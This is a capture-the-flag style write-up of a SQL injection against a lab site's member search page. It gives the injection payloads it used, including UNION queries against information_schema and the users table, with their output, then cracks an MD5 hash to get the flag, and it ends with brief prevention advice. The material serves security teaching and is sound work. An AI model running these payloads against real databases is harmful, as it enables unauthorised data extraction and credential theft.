# Description

Visiting the 'member' page, it display a search field that search for members by id.

Trying a basic sql injection test, putting a single quite in the search field a submit.

We got an sql syntax error:
`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1`

Then trying `1 or 1=1` will gives all members in the database:

```html
ID: 1 or 1=1 
First name: one
Surname : me

ID: 1 or 1=1 
First name: two
Surname : me

ID: 1 or 1=1 
First name: three
Surname : me

ID: 1 or 1=1 
First name: Flag
Surname : GetThe
```

# Attack

Now let's try to determine the SQL request 

As it seems from the last input the SQL request only retreive 2 columns so we will need to inject those columns with data from database.

Now let's look for all the databases names in the database using this sql injection.

    0 UNION select table_name,column_name from information_schema.columns

As you will see below we got the users database informations

```html
ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : user_id

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : first_name

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : last_name

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : town

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : country

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : planet

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : Commentaire

ID: 0 UNION select table_name,column_name from information_schema.columns 
First name: users
Surname : countersign
```

Now we will try to see what all users has on the `Commnetaire` Column, It may be something interesting.

    0 UNION select concat(first_name, last_name),concat(user_id,town,country,0,countersign,Commentaire) from users

```html
ID:   0 UNION select concat(first_name, last_name),concat(user_id,town,country,0,countersign,Commentaire) from users 
First name: FlagGetThe
Surname : 5424205ff9d0165b4f92b14994e5c685cdce28Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```
As you can see the user Flag Has this string result `5ff9d0165b4f92b14994e5c685cdce28 Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

Now decripting it with md5: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo

fortytwo (sha256): 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Prevention

To prevent SQL injection vulnerabilities, follow these measures:

- Use prepared statements with parameterized queries to separate SQL code from user input.
- Implement input validation and sanitize user inputs to prevent malicious input.
- Employ a Web Application Firewall (WAF) to detect and block malicious SQL injection attempts.
